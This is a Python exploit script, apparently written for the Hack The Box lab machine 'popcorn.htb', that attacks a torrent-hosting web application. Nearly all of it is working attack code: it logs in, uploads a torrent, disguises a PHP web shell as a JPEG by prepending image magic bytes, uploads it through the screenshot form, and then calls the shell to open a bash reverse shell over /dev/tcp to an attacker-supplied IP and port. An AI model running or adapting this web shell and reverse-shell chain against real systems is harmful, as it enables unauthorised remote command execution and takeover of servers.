#!/usr/bin/python

from dataclasses import dataclass
import readline
import requests
from bs4 import BeautifulSoup
import sys

if len(sys.argv) < 4:
    print('[+] Usage: python %s filename attackerIP attackerPort'%sys.argv[0])
    exit(0)

filename = sys.argv[1]
attackerIP = sys.argv[2]
attackerPort = sys.argv[3]

url = "http://popcorn.htb/torrent/"
username = "test_user"
password = "password"
s = requests.Session()
data= {"username":username, "password":password}
proxies = {"http": "http://127.0.0.1:8080"}
req = s.post(url + 'login.php', data=data, proxies=proxies)

print(req.status_code)

req = s.get(url + 'torrents.php?mode=upload', proxies=proxies)

if not b"login.php" in req.content:
    print("[+] upload page in!!")
else:
    print("[-] access failed")
    exit(0)

# headers={"Content-Type": "multipart/form-data; boundary=---------------------------16390259611740737781454375268"}
upload_data = {
    "filename": "test_name",
    "type": "1",
    "subtype": "1",
    "user_id": "",
    "anonymous2": "false",
    "anonymous": "true",
    "autoset": "enabled",
    "info": "this is test",
    "registration": "false", 
    "hideuser": "false",
    "submit": "Upload Torrent"
}

with open(filename, "rb") as f:
    torrent_data = f.read()

files = {
    'torrent': (filename, torrent_data, 'application/x-bittorrent'),
     }

req = s.post(url + 'torrents.php?mode=upload', files=files,data=upload_data, proxies=proxies)

if b"file upload succes" in req.content:
    print("[+] file upload succes!")

    res = req.content.decode('ISO-8859-1')
    soup = BeautifulSoup(res, 'html.parser')
    uploaded_url = soup.find_all('meta')[1].get('content')
    uploaded_url = uploaded_url.replace('0; url=', '')
    splited = uploaded_url.split('=')
    id = splited[2]
    print(id)

    req = s.get(url + '/edit.php?mode=edit&id=' + id, proxies=proxies)
    if b"Torrent Name" in req.content:
        print("[+] edit page in!!")

        shell = "\xff\xd8\xff<?php system($_REQUEST['cmd']); ?>"
        files = {
            'file': ('shell.php', shell, 'image/jpeg'),
        }
        screenshot_data = {"submit": "Submit Screenshot"}

        req = s.post(url + 'upload_file.php?mode=upload&id=' + id, files=files,data=screenshot_data, proxies=proxies)
        
        if b"Please refresh to see the new screenshot." in req.content:
            payload = 'bash -c "bash -i >%%26 /dev/tcp/%s/%s 0>%%261"'%(attackerIP,attackerPort)
            decoded_payload = requests.utils.quote(payload)

            req = s.get(url + 'upload/'+id+'.php?cmd='+payload, proxies=proxies)
            if req.status_code == 200:
                print('[+] Got shell!!')
            else:
                print('[-] shell page not found..')

        else:
            print('[-] screenshot upload failed..')
    
    else:
        print('[-] torrent edit page access failed..')
else:
    print('[-] torrent file upload faild..')